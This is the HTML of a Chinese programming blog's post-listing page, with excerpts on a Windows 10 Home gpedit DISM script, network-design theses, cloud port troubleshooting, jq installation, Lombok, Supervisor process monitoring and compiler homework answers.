<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a7b371524d46dbbaec0866c045c6c9c/" rel="bookmark">
			Win10家庭版找不到组策略gpedit.msc
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、首先建立一个cmd文件，或者建立txt文件在改成cmd都可以，如下图
@echo off pushd "%~dp0" dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt for /f %%i in ('findstr /i . List.txt 2^&gt;nul') do dism /online /norestart /add-package:"C:\Windows\servicing\Packages\%%i" pause 可以下载
https://pan.baidu.com/s/1FGcFCNL_ZL6R8fUAaMvm0w jw9d 保存到桌面。
二、以管理员身份点击
显示过程为
然后win+r就可以运行组策略gpedit.msc了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/013f06693fb778b640e01300bfd0849a/" rel="bookmark">
			基于静态NAT的中小企业服务器网络端口映射与实现（完整文档&#43;思科拓扑图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是小华学长，一名计算机领域的博主。经过多年的学习和实践，我积累了丰富的计算机知识和经验，在这里我想与大家分享我的学习心得和技巧，帮助你成为更好的程序员。
作为一名计算机博主，我一直专注于编程、算法、软件开发等领域，在这些方面积累了大量的经验。我相信分享是一种双赢的方式，通过分享，我可以帮助他人提升技术水平，同时也能够得到学习交流的机会。
在我的文章中，你将会看到我对于各种编程语言、开发工具以及常见问题的解析和分析。我会结合自己的实际项目经验，为你提供实用的解决方案和优化技巧。我相信这些经验不仅能够帮助你解决当前遇到的问题，还能够提升你的编程思维和解决问题的能力。
除了技术方面的分享，我还会涉及到一些关于职业发展和学习方法的话题。作为一名曾经的学生，我深知在计算机领域如何更好地提升自己和面对挑战。我会分享一些学习方法、面试技巧和职场经验，希望能够对你的职业发展产生积极的影响。
我的文章会发布在CSDN社区，这是一个非常活跃和专业的计算机技术社区。在这里，你可以与其他热爱技术的人们交流、学习和分享。通过关注我的博客，你可以第一时间获取到我的最新文章，并与我和其他读者互动交流。
如果你对计算机领域有兴趣，希望能够更好地提升自己的编程能力和技术水平，那么请关注我的CSDN博客。我相信我的分享会带给你帮助和启发，让你在计算机领域取得更大的成就！
让我们一起成为更好的程序员，共同探索计算机领域的精彩世界吧！感谢你的关注与支持！
分享的所有计算机项目源码均包含文档，可做毕业设计或课程设计，欢迎留言分享问题，交流经验！
摘 要
随着计算机网络技术的发展,网络地址日益紧缺,已经被视为是一种宝贵的网络资源。就在2019年，全球的IPV4地址已经分配完毕了，足可见互联网信息技术的发展是如此之快。
为了解决这个问题,网络地址转换(networkaddresstranslation, NAT)技术被人们广泛使用,它将网络地址从一个地址域映射到另-一个地址域。IPv4 地址日益不足是经常部署NAT 的一个主要原因。随着网络技术的发展，安全需求的提升，NAT 逐渐演变为隔离内外网络、保障网络安全的基本手段，而且采用这种技术，无须额外投资，单纯利用现有网络设备，即可轻松达到安全目的。因此一般用于企业，学校，网吧，小区等与互联网的通信。
本课题研究的静态NAT实现网络端口映射技术，在企业网的部署环境中，能让企业内部的服务器发布到互联网上供公网用户访问，就类似于我们在家中或者手机流量访问百度、腾讯等网站相似，将内部系统挂载至公网。
关键词： NAT 端口映射 网络 企业网 地址
Abstract
With the development of computer network technology, network address is increasingly scarce, which has been regarded as a valuable network resource. Just in 2019, the global IPv4 address has been allocated, which shows that the development of Internet information technology is so fast.
In order to solve this problem, network address translation (NAT) technology is widely used.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/013f06693fb778b640e01300bfd0849a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c1c333be877e1421edc68e4a517ecb7/" rel="bookmark">
			阿里云ECS端口无法访问是什么原因呢？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阿里云ECS端口无法访问是什么原因呢？本文将对此问题进行详细的分析，并提出一些可能的解决方法。
在阿里云ECS中，端口无法访问主要可能由以下几个原因导致：
首先，安全组规则配置不正确。
阿里云ECS的入站和出站流量都受到安全组的控制，如果没有正确设置允许特定端口的流量进入和出去，那么该端口就无法正常访问。
其次，可能是防火墙阻止了端口的访问。
阿里云ECS服务器上默认安装有iptables防火墙，如果防火墙规则设置不当，也会导致端口无法访问。
还有一个可能原因就是网络类型设置错误。
在ECS实例的VPC网络中，如果没有正确设置NAT网关或者弹性公网IP，那么私有网络内的ECS实例便无法访问互联网。
最后，ECS实例服务未正常启动或配置。
如果你的ECS实例服务，如Web服务器或数据库服务，没有正常启动或者配置，那么相应端口也无法访问。
针对以上几个可能的原因，我们可以采取相应的解决办法：
1、检查并正确配置安全组规则。确保你需要访问的端口在安全组中已被允许。
2、检查防火墙规则。你可以暂时关闭防火墙，看看端口是否可以正常访问，如果可以访问，那么问题就可能出在防火墙规则上。
3、检查你的网络类型设置，确认网络配置无误。
4、确认ECS实例服务是否正常启动，如果服务未正常运行，你可以尝试重启服务。
阿里云ECS端口无法访问的问题，可能因素众多，但只要耐心排查，总会找到问题所在。希望这篇文章能为大家提供一些帮助。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9e1f3cf40bca749b91d1b2ffbb0b70a/" rel="bookmark">
			vue3（ts报错）：类型“string | undefined”的参数不能赋给类型“string”的参数。不能将类型“undefined”分配给类型“string”。ts(2345)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错原因 ：在ts中对类型的要求很高需要转换为对应的类型
解决方法：使用强制转换 ： String(报错的数据)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/376d86a1627f3ee5f21c81d66ad8b271/" rel="bookmark">
			Linux shell jq工具（shell读取json、shell脚本读取json、shell json、json工具）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 jq工具安装在线安装离线安装 使用方法读取和修改 JSON 文件中的一个字段（麻烦）读取和修改 JSON 文件中的一个字段（简洁）1读取和修改 JSON 文件中的一个字段（简洁）220230329 这个稍复杂，读取json并替换另一个json字段一部分，加入了正则表达式jq内置函数`|=` 和 `sub``|=`：更新某个字段的值`sub`：替换字符串关于正则表达式`[0-9]+` 其他（直接把两个替换做到一起） jq的编译 jq工具安装 在线安装 sudo apt-get install jq # Ubuntu 系统 离线安装 如果你的服务器没有联网，则无法使用包管理器来安装 jq 工具。不过，你仍然可以通过以下步骤手动安装 jq 工具：
在另一台联网的计算机上下载 jq 的二进制文件。可以在 jq 的官方网站上找到适合你服务器架构的二进制文件。例如，如果你的服务器是 x86 64 位架构，则可以在以下链接中下载 jq 的二进制文件：
https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64 其他版本下载点这：https://github.com/jqlang/jq/releases/
将下载的二进制文件传输到您的服务器。你可以使用 scp 命令或其他文件传输工具将文件传输到服务器。例如，如果你的服务器的 IP 地址是 192.168.0.100，你可以使用以下命令将文件传输到服务器： scp jq-linux64 user@192.168.0.100:/home/user/ 其中，user 是你在服务器上的用户名，/home/user/ 是你在服务器上的目标目录。
在服务器上设置 jq 的执行权限。使用以下命令将 jq 文件设置为可执行： chmod +x /home/user/jq-linux64 将 jq 文件复制到你的 PATH 路径中。使用以下命令将 jq 文件复制到 /usr/local/bin/ 目录中： sudo cp /home/user/jq-linux64 /usr/local/bin/jq 现在，你可以在服务器上使用 jq 工具了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/376d86a1627f3ee5f21c81d66ad8b271/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/871722972cf489a1a1ff35a0e6d1b6da/" rel="bookmark">
			中小型企业网络安全防护设计（完整文档&#43;拓扑图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是小华学长，一名计算机领域的博主。经过多年的学习和实践，我积累了丰富的计算机知识和经验，在这里我想与大家分享我的学习心得和技巧，帮助你成为更好的程序员。
作为一名计算机博主，我一直专注于编程、算法、软件开发等领域，在这些方面积累了大量的经验。我相信分享是一种双赢的方式，通过分享，我可以帮助他人提升技术水平，同时也能够得到学习交流的机会。
在我的文章中，你将会看到我对于各种编程语言、开发工具以及常见问题的解析和分析。我会结合自己的实际项目经验，为你提供实用的解决方案和优化技巧。我相信这些经验不仅能够帮助你解决当前遇到的问题，还能够提升你的编程思维和解决问题的能力。
除了技术方面的分享，我还会涉及到一些关于职业发展和学习方法的话题。作为一名曾经的学生，我深知在计算机领域如何更好地提升自己和面对挑战。我会分享一些学习方法、面试技巧和职场经验，希望能够对你的职业发展产生积极的影响。
我的文章会发布在CSDN社区，这是一个非常活跃和专业的计算机技术社区。在这里，你可以与其他热爱技术的人们交流、学习和分享。通过关注我的博客，你可以第一时间获取到我的最新文章，并与我和其他读者互动交流。
如果你对计算机领域有兴趣，希望能够更好地提升自己的编程能力和技术水平，那么请关注我的CSDN博客。我相信我的分享会带给你帮助和启发，让你在计算机领域取得更大的成就！
让我们一起成为更好的程序员，共同探索计算机领域的精彩世界吧！感谢你的关注与支持！
分享的所有计算机项目源码均包含文档，可做毕业设计或课程设计，欢迎留言分享问题，交流经验！
摘 要
随着计算机网络技术的迅速发展，特别是信息时代的来临，人们逐渐意识到信息化的重要性，一个企业拥有自己的网络已经成为企业发展的必然趋势，企业网络的组建是企业向信息化发展的必然选择。现在许多企业纷纷建设自己的网站来宣传品牌，提高品牌影响力。但随着计算机网络技术的不断提高与发展，很多企业网络的性能已经跟不上现代信息的变化了，对于很多企业来说扩展现有网络是必不可少的措施。近年来，随着网络技术的不断提高与成熟，企业对计算机网络系统的依赖程度也越来越高，现在企业对新建网络的向后兼容性的要求也越来越高。因此本毕业设计课题主要是以企业网络规划建设过程可能用到的各种技术及实施方案为设计方向，为企业网络系统的组建与设计提供理论依据和实践指导。
本设计结合中小型企业的实际需求，举例分析、设计、配置、模拟组建了一个中小型企业双核心双链路的网络，主要使用了HSRP、OSPF、ACL、NAT等技术进行设计完善。
本次设计的网络架构和实施，大大地提高了企业内的办公效率，企业员工带来了很大的方便性和十足的上网体验感，并且使用控制列表针对安全方面的控制加深。
关键词： ACL 企业 网络 计算机 网络架构
Abstract
With the rapid development of computer network technology, especially the advent of the information age, people gradually realize the importance of informatization. It has become an inevitable trend for an enterprise to have its own network. The establishment of enterprise network is an inevitable choice for an enterprise to develop towards informatization.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/871722972cf489a1a1ff35a0e6d1b6da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25576acae15cc07273a23ac0c8d43b1b/" rel="bookmark">
			医院网络设计（完整文档&#43;思科拓扑图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是小华学长，一名计算机领域的博主。经过多年的学习和实践，我积累了丰富的计算机知识和经验，在这里我想与大家分享我的学习心得和技巧，帮助你成为更好的程序员。
作为一名计算机博主，我一直专注于编程、算法、软件开发等领域，在这些方面积累了大量的经验。我相信分享是一种双赢的方式，通过分享，我可以帮助他人提升技术水平，同时也能够得到学习交流的机会。
在我的文章中，你将会看到我对于各种编程语言、开发工具以及常见问题的解析和分析。我会结合自己的实际项目经验，为你提供实用的解决方案和优化技巧。我相信这些经验不仅能够帮助你解决当前遇到的问题，还能够提升你的编程思维和解决问题的能力。
除了技术方面的分享，我还会涉及到一些关于职业发展和学习方法的话题。作为一名曾经的学生，我深知在计算机领域如何更好地提升自己和面对挑战。我会分享一些学习方法、面试技巧和职场经验，希望能够对你的职业发展产生积极的影响。
我的文章会发布在CSDN社区，这是一个非常活跃和专业的计算机技术社区。在这里，你可以与其他热爱技术的人们交流、学习和分享。通过关注我的博客，你可以第一时间获取到我的最新文章，并与我和其他读者互动交流。
如果你对计算机领域有兴趣，希望能够更好地提升自己的编程能力和技术水平，那么请关注我的CSDN博客。我相信我的分享会带给你帮助和启发，让你在计算机领域取得更大的成就！
让我们一起成为更好的程序员，共同探索计算机领域的精彩世界吧！感谢你的关注与支持！
分享的所有计算机项目源码均包含文档，可做毕业设计或课程设计，欢迎留言分享问题，交流经验！
题目：医院网络设计
摘要 随着现代信息科技的力量不断壮大,信息技术现今广泛运用在多种行业领域,并且在很大程度上推动了医疗卫生业信息技术建设。针对一个医院医疗系统而言,具有一个稳定 的网络系统显得十分重要。医院的工作离不开网络的建设，因此医院的日常管理必须要与世界接轨，与信息技术接轨。一旦网络或数据丢失，将会给医院和病人带来巨大的灾难和难以弥补的损失，因此，医院计算机网络系统的安全工作非常重要。结合当前最新的网络技术，针对医院网络规划与设计规划出一套科学合理网络设计方案，对于未来医院的发展是有着重要意义和作用的。先进的无线网络不仅优化了医护人员的工作流程，提高了工作效率，保障了医疗安全，同时给患者及家属提供了高质量的服务，对医院信息化建设具有非常重要的意义。
关键词：医院网络；网络规划；网络技术
Abstract With the growing power of modern information technology, information technology is widely used in various industries, and to a large extent, it promotes the construction of medical and health information technology. For a hospital medical system, it is very important to have a stable network system. The work of hospital can not be separated from the construction of network, so the daily management of hospital must be in line with the world and information technology.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25576acae15cc07273a23ac0c8d43b1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b712e810bb865c98f0ea78eddad6d234/" rel="bookmark">
			酒店网络设计与仿真（完整文档&#43;思科拓扑图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是小华学长，一名计算机领域的博主。经过多年的学习和实践，我积累了丰富的计算机知识和经验，在这里我想与大家分享我的学习心得和技巧，帮助你成为更好的程序员。
作为一名计算机博主，我一直专注于编程、算法、软件开发等领域，在这些方面积累了大量的经验。我相信分享是一种双赢的方式，通过分享，我可以帮助他人提升技术水平，同时也能够得到学习交流的机会。
在我的文章中，你将会看到我对于各种编程语言、开发工具以及常见问题的解析和分析。我会结合自己的实际项目经验，为你提供实用的解决方案和优化技巧。我相信这些经验不仅能够帮助你解决当前遇到的问题，还能够提升你的编程思维和解决问题的能力。
除了技术方面的分享，我还会涉及到一些关于职业发展和学习方法的话题。作为一名曾经的学生，我深知在计算机领域如何更好地提升自己和面对挑战。我会分享一些学习方法、面试技巧和职场经验，希望能够对你的职业发展产生积极的影响。
我的文章会发布在CSDN社区，这是一个非常活跃和专业的计算机技术社区。在这里，你可以与其他热爱技术的人们交流、学习和分享。通过关注我的博客，你可以第一时间获取到我的最新文章，并与我和其他读者互动交流。
如果你对计算机领域有兴趣，希望能够更好地提升自己的编程能力和技术水平，那么请关注我的CSDN博客。我相信我的分享会带给你帮助和启发，让你在计算机领域取得更大的成就！
让我们一起成为更好的程序员，共同探索计算机领域的精彩世界吧！感谢你的关注与支持！
分享的所有计算机项目源码均包含文档，可做毕业设计或课程设计，欢迎留言分享问题，交流经验！
摘 要 本次针对思科Cisco tracer packet模拟器所设计的某酒店网络图说明书，主要是说明服务行业酒店的规划设计过程，并且对其从拓扑规划到过程设计再到连通性测试有个整体阐述过程。
参考同级别同行业的网络拓扑组网需求，应该严格遵守标准化的建网需求，通过模块化、层次化、标准化的各个原则进行建网搭设，从底层终端到接入层到汇聚层到中坚汇聚层再到出口都应该合理分配网络资源从而实现安全、有效的网络拓扑。整个酒店网络主要分为：酒店大厅、餐饮部、客房部、收纳部以及服务器群区，并且整个酒店由无线覆盖，整个酒店所用网络设备由不同网络厂商组成，防火墙主要以华为、山石提供，核心层路由设备主要以思科、华为提供，汇聚层主要以华为、华三提供，接入层主要由华三、锐捷提供，无线主要是锐捷无线。
酒店网络属于服务行业，因此整个内网使用思科私有协议EIGRP路由协议，以为其路由协议收敛速度更快、稳定性更强。包括整体性、隐私性、安全性在任何行业内都是最高等级的，因此在出口网络中应该严格定义内、外网墙的安全策略等级。计算机网络工程专业作为当今IT界内朝阳专业，因此需要我们当代大学生能够精通学习其重要技术，并且这是一个能够足够提现作为大学生来说专业技能的掌握程度。
关键词：组网需求；酒店网络；Cisco packet tracer；
1 绪论....................................................................................................... 8
1.1 课题研究背景.............................................................................. 8
1.2 课题研究的目的与意义............................................................... 8
1.3 课题主要内容与研究路线............................................................ 9
2 基于EIGRP协议技术介绍.................................................................. 10
2.1 EIGRP相关概念............................................................................ 10
2.2 EIGRP相关特点............................................................................ 10
2.3 路由协议特性比较...................................................................... 11
2.4 DUAL算法介绍............................................................................ 12
3 二层网络技术分析.............................................................................. 13
3.1 虚拟的局域网——VLAN............................................................. 13
3.2 生成树协议——STP.................................................................... 13
3.2.1 生成树协议原理...................................................................... 13
3.2.2 BPDU报文................................................................................. 15
3.3 访问控制列表技术——ACL........................................................ 16
3.4 地址转换技术——NAT............................................................... 17
3.5 动态获取IP地址技术——DHCP................................................. 18
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b712e810bb865c98f0ea78eddad6d234/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f81f742b184c8b772d966aa56035ae9c/" rel="bookmark">
			自动化测试工具比传统测试工具的优势体现在哪里？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着软件行业的快速发展和扩张，自动化测试工具在提高测试效率和质量方面起到了不可或缺的作用，那你知道自动化测试工具比传统测试工具的优势体现在哪里吗？
首先，自动化测试工具能够大大缩短测试周期。相比于传统手动测试，自动化测试工具能够在短时间内执行大量繁重的测试任务，快速发现潜在的缺陷和问题。通过脚本的方式编写测试，测试人员可以一次性运行相同的测试用例多次，大大减少了测试时间，并提高了测试的覆盖率。
其次，自动化测试工具提供了更高的测试精确度和一致性。人工测试存在着主观性和个体差异，测试结果可能会受到人为因素的影响。而自动化测试工具使用相同的测试条件和步骤执行测试，保持了一致性和可重复性。这不仅提高了测试结果的准确性，还减少了人为误差的可能性。
第三，自动化测试工具能够有效降低测试成本。尽管自动化测试工具需要一定的初始投资和学习成本，但在长期运行中，它们可以显著降低人工测试的成本。由于自动化测试可以在无人值守的情况下运行，测试人员的工作量得以减轻，并且可以通过重复使用测试脚本来节省时间和精力。
另外，自动化测试工具还可以提高测试的可靠性和可扩展性。通过自动执行测试脚本，可以减少人为错误的发生，并提高测试的可靠性。此外，自动化测试工具还能够有效应对不同规模和复杂度的项目，能够适应不同环境和需求，并且可以轻松地进行测试用例的管理和维护。
最后，自动化测试工具可以充分利用计算机的计算能力和资源。自动化测试工具能够快速执行大规模的测试用例，同时可以并行运行多个测试任务，充分发挥了计算机的高速和多任务处理的特点。这使得在相同时间内可以进行更多的测试活动，提高了测试的效率和效果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e272b98e7dc3419eb13ba34c1aa25e6d/" rel="bookmark">
			小程序实现自定义分享微信好友及微信朋友圈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先在全局page.json中添加"shareAppMessage": true
{ "path": "pages/brandCoupon/brandCoupon", "style": { "navigationBarTitleText": "霸王餐", "navigationStyle": "custom", "enablePullDownRefresh":true, "shareAppMessage": true } }, 然后在组件中指定按钮类型为share分享类型
通过v-bind:data-bargainGood绑定并传入给onShareAppMessage分享微信好友后要显示的内容
title表示分享后展示的文本信息
imageUrl表示展示的图片
path表示点击分享的链接要跳转到的页面
&lt;button open-type="share" v-bind:data-bargainGood="{goodsname, spdetailImg,origin_price,refer_price}" class="share"&gt; &lt;view class="discount"&gt;邀请帮砍&lt;image src="https://ebk-picture.oss-cn-hangzhou.aliyuncs.com/mini-wx/images/bargain/share.png" mode=""&gt;&lt;/image&gt; &lt;/view&gt; &lt;view class="mustPrice"&gt;最低砍至{{bestPrice}}元&lt;/view&gt; &lt;/button&gt; 注意：如果在组件中配置了withShareTicket为true，转到微信之后长按不会出现转发按钮
wx.showShareMenu({ withShareTicket: true, // 是否使用带 shareTicket 的转发 menus: ['shareAppMessage'] // 可以指定分享到朋友圈、群等的菜单列表，默认为['shareAppMessage', 'shareTimeline'] }); onShareAppMessage(e) { console.log(e) var {goodsname,goodsId, spdetailImg,origin_price,refer_price}=this // console.log(e.target.dataset,'onShareAppMessage');	let userId = uni.getStorageSync('userInfo').uid refer_price = '原价'+refer_price/100+'元'; origin_price = '售价'+ origin_price/100+'元' // let already_grade_amount = '当前'+e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e272b98e7dc3419eb13ba34c1aa25e6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aedb3d262d4870f28d2af91e62cbffba/" rel="bookmark">
			@Data 、@AllArgsConstructor 、@NoArgsConstructor、
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先在maven添加好依赖，引入lombok，引入这个工具，是用来简化自己的代码书写的，看起来简洁一些
&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.4&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; 优缺点
优点：
能通过注解的形式自动生成构造器、getter/setter、equals、hashcode、toString等方法，提高了一定的开发效率，让代码变得简洁，不用过多的去关注相应的方法，属性做修改时，也简化了维护为这些属性所生成的getter/setter方法等
缺点：
不支持多种参数构造器的重载，比如从属性里面随遍挑出来几个，如果需要用到的话，自己手动书写。
虽然省去了手动创建getter/setter方法的麻烦，但大大降低了源代码的可读性和完整性，降低了阅读源代码的舒适度
像 lombok 这种插件，已经不仅仅是插件了，它在编译器编译时通过操作AST（抽象语法树）改变字节码生成，变相的说它就是在改变java语法，它改变了你编写源码的方式，它不像 spring 的依赖注入一样是运行时的特性，而是编译时的特性。如果一个项目有非常多这样的插件，会极大的降低阅读源代码的舒适度。
接下来是代码对比：
这是没有使用lombok里面的各种注解的
public class Teacher { private Integer id; private String name; private Integer age; private char gender;//记得字符要用单引号'' // @NoArgsConstructor //无参构造方法 public Teacher() {} //可以使用@AllArgsConstructor //全部参数的构造方法 public Teacher(Integer id, String name, Integer age, char gender) { this.id = id; this.name = name; this.age = age; this.gender = gender; } //底下的get和set方法，可以使用@Data， //set就是把你写的数据放进这个类里面，然后set是把这个类里面的数据给你取出来 public Integer getId() { return id; } public void setId(Integer id) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aedb3d262d4870f28d2af91e62cbffba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69596818948d1f7e83de102b250f145a/" rel="bookmark">
			820和8155区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		高通820a
高通的芯片有点像TI的影音娱乐系统的soc。MSM8996
820a是不带基带版的820处理器。820采用全新自主定制bai的Kryo架构（这个名为 Kryo 架构基于 ARMv8 指令集，支持 64 位运算，最高可支持 3GHz 的主频）。
2014 年 CES，高通第一次展露自己的智能座舱计划，从 602A 到 820A。
骁龙 820A、特斯拉 Autopilot 硬件 3.0、英伟达 Xavier 等 SOC 采用的 14 纳米工艺。
在820A平台上，使用hypervisor，QNX系统启动时间小于3秒，Android系统启动时间小于18秒，倒车影像启动小于3秒。
8155P
高通骁龙SA8155平台属于多核异构的系统，性能是原有高通820平台的三倍。
SA8155P 这个名字听起来很陌生，但你应该听过它的消费版：骁龙 855。
8155 也是基于台积电第一代 7 纳米工艺打造的 SOC，也是第一款 7 纳米工艺打造的车规级数字座舱 SOC。
8155 还支持新一代的联网技术，包括 WiFi6、蓝牙 5.0 等等。
和 820A 相比，8155 将 WiFi 模块从外挂改成芯片内置，体积更小发热更低，同时最大带宽翻了 3 倍，简单点说就是你以后 OTA 过程中稳定性和速度都会好不少。
另外，8155 支持的蓝牙 5.0 和 820A 支持的蓝牙 4.1 相比，带宽达到了 2Mbps（4.1 为 1Mbps），并且有效传输距离提升到 4.1 的四倍，功耗却要更低。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69596818948d1f7e83de102b250f145a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b3574c21ed68aff58a216eeb4d6cfb8/" rel="bookmark">
			linux 对进程意外死亡进行监听并重启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Supervisor（监督进程管理器）是一个用于监控和管理其他进程的工具。它通常用于服务器环境中，特别是在希望确保关键进程的稳定性和可靠性的情况下。
Supervisor的主要作用是启动、停止和管理后台进程，并在进程崩溃或意外退出时自动重启它们。它提供了一种简单而有效的方式来监控和控制进程，并确保它们始终处于运行状态。
Supervisor具有以下特点和功能：
进程管理：可以同时管理多个进程，并提供启动、停止、重启等操作。监控和报警：可以实时监控进程的状态，并在进程异常或崩溃时触发警报通知。重启策略：可以配置不同的重启策略，如自动重启、逐渐延迟重启等，以应对不同类型的进程问题。配置管理：可以通过配置文件或命令行参数来定义和管理进程，包括进程的启动命令、工作目录、日志输出等。日志管理：可以收集和管理进程的日志，方便故障排查和问题定位。 Supervisor是一个跨平台的工具，可以在多种操作系统上运行，如Linux、Unix和Windows等。它被广泛应用于Web服务器、数据库服务器、应用服务器等场景，提供了一种可靠的方式来管理和监控后台进程，保证系统的稳定性和可用性。
使用方案 确保你已经安装了 Supervisor。在 CentOS 中，可以使用以下命令安装： yum install supervisor 检查 Supervisor 服务是否正在运行。你可以使用以下命令查看服务的状态： service supervisord status 如果服务没有运行，你可以使用以下命令启动它：
service supervisord start 配置文件编写 [program:my_java_app] command=/usr/bin/java -jar /path/to/your/app.jar autostart=true autorestart=true user=youruser redirect_stderr=true 在这个配置中，command指令指定了如何启动你的Java程序。autostart指令设置为true表示在Supervisor启动时自动启动你的程序。autorestart指令设置为true表示在你的程序意外退出时自动重启它。user指令指定了运行你的程序的用户，redirect_stderr指令表示将错误输出重定向到Supervisor的日志。
编写完毕后，放入配置到指定地方
一般情况下为： /etc/supervisord.d读取新的配置文件
这会让 Supervisor 读取新的和改变的配置文件。 supervisorctl reread 更新配置
这会让 Supervisor 更新它的状态，并尝试启动在配置文件中定义的但尚未运行的程序。 supervisorctl update 启动配置
这会启动你的 my_java_app 程序。
这里的my_java_app是你的配置文件里面设置的名称，而不是你的文件名 supervisorctl start my_java_app 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fb1c1194c0be407f29b4417b3720f3c/" rel="bookmark">
			编译原理 | 第三章课后习题答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文为编译原理（第三版）【清华大学出版社】部分课后答案
本答案均截取自网络，如有错误，望指正
编译原理（第三版）【清华大学出版社】 📌第1题 【题目】
【答案】
1.void MatchToken(char expected) 2.{ 3. if (lookahead != expected) 4. { 5. printf("syntax error \n"); 6. exit(0); 7. } 8. else 9. { 10. lookahead = getToken(); 11. } 12.} 13.// 解析非终结符T:T→ST’ 14.void ParseT() 15.{ 16. if (lookahead == 'a' || lookahead == '⋀' || lookahead == '(') 17. ParseS(); 18. ParseT′(); 19. else { 20. printf("syntax error \n"); 21. exit(0); 22. } 23.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fb1c1194c0be407f29b4417b3720f3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8aef3a4ca2e4dcb5601dc6abff149e6a/" rel="bookmark">
			关于在网关中白名单配置的使用(AntPathMatcher)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
